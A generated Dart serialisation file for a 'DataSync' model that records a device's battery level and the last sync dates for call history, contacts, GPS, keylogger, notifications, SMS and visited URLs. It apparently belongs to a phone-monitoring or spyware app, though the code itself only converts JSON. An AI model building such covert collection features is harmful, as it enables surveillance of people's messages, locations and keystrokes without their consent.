// GENERATED CODE - DO NOT MODIFY BY HAND

part of 'data_sync.dart';

// **************************************************************************
// JsonSerializableGenerator
// **************************************************************************

_$DataSyncImpl _$$DataSyncImplFromJson(Map<String, dynamic> json) =>
    _$DataSyncImpl(
      deviceId: json['deviceId'] as int,
      battery: json['battery'] as int? ?? 0,
      lastCallHistoryDate: json['lastCallHistoryDate'] as String?,
      lastContactDate: json['lastContactDate'] as String?,
      lastGPSDate: json['lastGPSDate'] as String?,
      lastKeyLoggerDate: json['lastKeyloggerDate'] as String?,
      lastNotificationDate: json['lastNotificationDate'] as String?,
      lastSMSDate: json['lastSMSDate'] as String?,
      lastURLDate: json['lastURLDate'] as String?,
      modifiedDate: json['modifiedDate'] as String,
    );

Map<String, dynamic> _$$DataSyncImplToJson(_$DataSyncImpl instance) =>
    <String, dynamic>{
      'deviceId': instance.deviceId,
      'battery': instance.battery,
      'lastCallHistoryDate': instance.lastCallHistoryDate,
      'lastContactDate': instance.lastContactDate,
      'lastGPSDate': instance.lastGPSDate,
      'lastKeyloggerDate': instance.lastKeyLoggerDate,
      'lastNotificationDate': instance.lastNotificationDate,
      'lastSMSDate': instance.lastSMSDate,
      'lastURLDate': instance.lastURLDate,
      'modifiedDate': instance.modifiedDate,
    };
